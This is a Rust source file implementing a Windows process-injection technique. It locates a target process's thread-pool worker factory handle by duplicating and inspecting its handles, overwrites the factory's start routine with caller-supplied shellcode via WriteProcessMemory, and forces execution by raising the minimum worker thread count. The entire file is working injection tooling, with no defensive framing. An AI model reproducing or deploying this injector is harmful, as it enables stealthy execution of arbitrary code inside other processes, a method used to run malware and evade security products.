use winapi::{
    ctypes::c_void,
    shared::{
        ntdef::{HANDLE, NTSTATUS, NT_SUCCESS, PVOID},
        basetsd::SIZE_T,
        ntstatus::{STATUS_ACCESS_DENIED, STATUS_NOT_FOUND},
    },
    um::{
        handleapi::{DuplicateHandle, CloseHandle},
        memoryapi::WriteProcessMemory,
        processthreadsapi::{OpenProcess, GetCurrentProcess},
        winnt::{
            PROCESS_VM_READ,
            PROCESS_VM_WRITE,
            PROCESS_VM_OPERATION,
            PROCESS_DUP_HANDLE,
            PROCESS_QUERY_INFORMATION,
            DUPLICATE_SAME_ACCESS,
        },
    },
};

use ntapi::{
    ntexapi::{
        NtQueryInformationWorkerFactory,
        NtSetInformationWorkerFactory,
        WorkerFactoryBasicInformation,
        WORKER_FACTORY_BASIC_INFORMATION,
        WorkerFactoryThreadMinimum,
    },
    ntobapi::{
        NtQueryObject,
        ObjectTypeInformation,
        OBJECT_TYPE_INFORMATION,
    },
    ntpsapi::{
        NtQueryInformationProcess,
        ProcessHandleInformation,
    },
};

#[repr(C)]
struct HandleEntry {
    handle_value: HANDLE,
    granted_access: u32,
}

#[repr(C)]
struct ProcessHandleInfo {
    number_of_handles: usize,
    handles: [HandleEntry; 1], // This is actually a flexible array
}

pub fn wrapper(shellcode: &[u8], pid: u32) {
    party_time(shellcode, pid);
}

fn party_time(shellcode: &[u8], pid: u32) {
    //println!("Hello, world!");
    //get handle to target process
    let process_handle = get_target_process_handle(pid);
    println!("Process handle: {:?}", process_handle);

    //find worker factory handle
    let worker_factory_handle = find_worker_factory_handle(process_handle)
        .unwrap_or_else(|status| {
            panic!("Failed to find worker factory handle. Status: {:x}", status)
        });
    println!("Worker factory handle: {:?}", worker_factory_handle);

    //get worker factory basic info
    let worker_factory_basic_info = get_worker_factory_basic_info(worker_factory_handle)
        .unwrap_or_else(|status| {
            panic!("Failed to get worker factory basic info. Status: {:x}", status)
        });
    println!("Worker factory basic info start routine address: {:?}", worker_factory_basic_info.StartRoutine);

    //write shellcode to the existing start routine address
    let status = write_shellcode_to_memory(process_handle, worker_factory_basic_info.StartRoutine as *mut c_void, shellcode);
    if !NT_SUCCESS(status) {
        panic!("Failed to write shellcode to the existing start routine address. Status: {:x}", status)
    }

    //print success message
    println!("Shellcode written to the existing start routine address.");

    //Trigger execution by increasing minimum thread count
    let status = setup_execution(worker_factory_handle, &worker_factory_basic_info);
    if !NT_SUCCESS(status) {
        panic!("Failed to trigger shellcode execution. Status: {:x}", status);
    }

    println!("Execution triggered successfully.");
}

fn get_target_process_handle(pid: u32) -> HANDLE {
    let process_handle = unsafe { OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, 0, pid) };
    process_handle
}

fn find_worker_factory_handle(process_handle: HANDLE) -> Result<HANDLE, NTSTATUS> {
    let mut _buffer_size: usize = 1024 * 1024; // 1MB initial buffer
    let mut handle_info: Vec<u8> = vec![0u8; _buffer_size];
    let mut return_length: u32 = 0;
    
    // Query process handle information
    unsafe {
        let status = NtQueryInformationProcess(
            process_handle,
            ProcessHandleInformation,
            handle_info.as_mut_ptr() as _,
            handle_info.capacity() as u32,
            &mut return_length,
        );

        //println!("Query status: {:x}, return length: {}", status, return_length);
        
        if !NT_SUCCESS(status) {
            return Err(status);
        }

    }

    let handle_snapshot = handle_info.as_ptr() as *const ProcessHandleInfo;
        let handles = unsafe { std::slice::from_raw_parts(
            &(*handle_snapshot).handles as *const HandleEntry,
            (*handle_snapshot).number_of_handles
        ) };
        //println!("Number of handles: {}", handles.len());

        for handle_entry in handles {
            let mut duplicated_handle: HANDLE = std::ptr::null_mut();
    
        // Try to duplicate the handle
        let dup_result = unsafe {
            DuplicateHandle(
                process_handle,
                handle_entry.handle_value,
                GetCurrentProcess(),
                &mut duplicated_handle,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            )
        };
        
        if dup_result == 0 {
            continue;
        }

        // Get size needed for object info
        let mut type_info_len = 0;
        let _ = unsafe { NtQueryObject(
            duplicated_handle,
            ObjectTypeInformation,
            std::ptr::null_mut(),
            0,
            &mut type_info_len
        ) };

        // Get actual object info
        let mut type_info = vec![0u8; type_info_len as usize];
        let status = unsafe { NtQueryObject(
            duplicated_handle,
            ObjectTypeInformation,
            type_info.as_mut_ptr() as PVOID,
            type_info_len,
            std::ptr::null_mut()
        ) };

        if NT_SUCCESS(status) {
            let type_info = type_info.as_ptr() as *const OBJECT_TYPE_INFORMATION;
            let type_name = unsafe { std::slice::from_raw_parts(
                (*type_info).TypeName.Buffer as *const u16,
                (*type_info).TypeName.Length as usize / 2
            ) };

            if let Ok(name) = String::from_utf16(type_name) {
                if name == "TpWorkerFactory" {
                    return Ok(duplicated_handle);
                }
            }
        }

        unsafe { CloseHandle(duplicated_handle) };
    }

    Err(STATUS_NOT_FOUND)
}
    
fn get_worker_factory_basic_info(worker_factory_handle: HANDLE) -> Result<WORKER_FACTORY_BASIC_INFORMATION, NTSTATUS> {
    let mut basic_info: WORKER_FACTORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };

    let status = unsafe { NtQueryInformationWorkerFactory(
        worker_factory_handle,
        WorkerFactoryBasicInformation,
        &mut basic_info as *mut _ as *mut c_void,  // Cast to raw pointer
        std::mem::size_of::<WORKER_FACTORY_BASIC_INFORMATION>() as u32,
        std::ptr::null_mut()
    ) };

    if !NT_SUCCESS(status) {
        return Err(status);
    }

    Ok(basic_info)
}

fn write_shellcode_to_memory(process_handle: HANDLE, start_routine_address: *mut c_void, shellcode: &[u8]) -> NTSTATUS {
    let write_result = unsafe { WriteProcessMemory(
        process_handle,
        start_routine_address,
        shellcode.as_ptr() as *const c_void,
        shellcode.len() as SIZE_T,
        std::ptr::null_mut()
    ) };

    if write_result == 0 {
        return STATUS_ACCESS_DENIED;
    }

    0 // Return success status (0)
}

fn setup_execution(worker_factory_handle: HANDLE, basic_info: &WORKER_FACTORY_BASIC_INFORMATION) -> NTSTATUS {
    // Set minimum thread count to current + 1 to force creation of new thread
    let min_thread_count: u32 = basic_info.TotalWorkerCount + 1; // Using TotalWorkerCount instead
    
    let status = unsafe {
        NtSetInformationWorkerFactory(
            worker_factory_handle,
            WorkerFactoryThreadMinimum,
            &min_thread_count as *const _ as *mut c_void,
            std::mem::size_of::<u32>() as u32
        )
    };

    if !NT_SUCCESS(status) {
        panic!("Failed to set worker factory thread minimum. Status: {:x}", status);
    }

    status
}


